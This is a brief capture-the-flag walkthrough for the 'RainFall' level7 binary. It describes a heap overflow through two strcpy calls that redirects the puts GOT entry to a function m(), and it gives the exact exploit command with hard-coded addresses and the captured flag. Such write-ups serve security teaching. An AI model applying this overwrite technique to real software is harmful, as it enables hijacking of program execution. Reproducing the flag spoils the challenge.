# Walkthrough

## Disassembling the executable 

see source.c

## Analysis

We used the first strcpy to overwrite perdu[1] to point to the address of put

We used the second strcpy to write on put() the address of the function m()

This way, when the put function is called, in fact it is calling the m().
```
level7@RainFall:~$ ./level7 $(python -c "print('A' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1643577400

```


